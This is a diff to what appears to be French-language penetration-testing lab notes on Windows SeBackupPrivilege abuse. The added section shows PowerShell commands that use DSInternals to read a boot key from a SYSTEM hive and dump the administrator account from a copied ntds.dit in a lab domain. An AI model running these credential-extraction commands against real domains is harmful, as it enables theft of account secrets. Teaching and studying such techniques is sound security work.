@@ -54,7 +54,15 @@ DISKSHADOW> exit
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
-## # 
+### Extraction des informations présentes dans NTDS.dit
+
+```powershell-session
+PS C:\htb> Import-Module .\DSInternals.psd1
+PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+
+
+```
 
 ## A distance
 
